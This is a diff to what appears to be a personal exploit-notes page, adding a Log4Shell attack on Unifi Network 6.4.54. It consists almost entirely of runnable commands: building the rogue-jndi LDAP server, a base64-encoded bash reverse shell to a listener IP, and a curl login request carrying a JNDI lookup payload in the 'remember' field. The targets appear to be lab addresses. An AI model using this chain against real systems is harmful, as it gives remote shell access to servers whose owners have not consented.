@@ -12,6 +12,24 @@ description: 'tl;dr: This page tracks things I have pwn''d before with public ex
 
 * Unifi Network 6.4.54
 * [https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)
+* Testing, capture auth attempt in burp&#x20;
+
+
+
+```
+git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
+echo 'bash -c bash -i >&/dev/tcp/10.10.15.96/9001 0>&1' | base64
+java -jar /opt/rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuOTYvOTAwMSAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.15.96"
+```
+
+* `--hostname` is your localhost tun0 interface
+* Once you have completed the set up, run this for your reverse shell&#x20;
+
+```
+curl -i -s -k -X POST -H $'Host: 10.129.117.73:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.15.96:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.117.73:8443/api/login'
+```
+
+
 
 ### Apache Struts2
 
